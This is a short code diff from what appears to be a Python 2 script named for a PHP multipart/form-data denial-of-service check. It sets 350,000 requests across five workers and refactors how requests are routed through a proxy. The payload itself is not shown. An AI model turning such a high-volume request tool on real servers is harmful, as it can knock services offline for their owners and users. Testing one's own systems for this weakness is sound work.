@@ -39,16 +39,11 @@ request_num = 350000
 worker_num = 5
 
 
-def http_proxy(proxy_url):
-    proxy_handler = urllib2.ProxyHandler({"http": proxy_url})
+def check_php_multipartform_dos(url, post_body, headers, ip):
+    proxy_handler = urllib2.ProxyHandler({"http": ip})
     null_proxy_handler = urllib2.ProxyHandler({})
     opener = urllib2.build_opener(proxy_handler)
     urllib2.install_opener(opener)
-# end http_proxy
-
-
-def check_php_multipartform_dos(url, post_body, headers, ip):
-    http_proxy(ip)
     req = urllib2.Request(url)
     for key in headers.keys():
         req.add_header(key, headers[key])
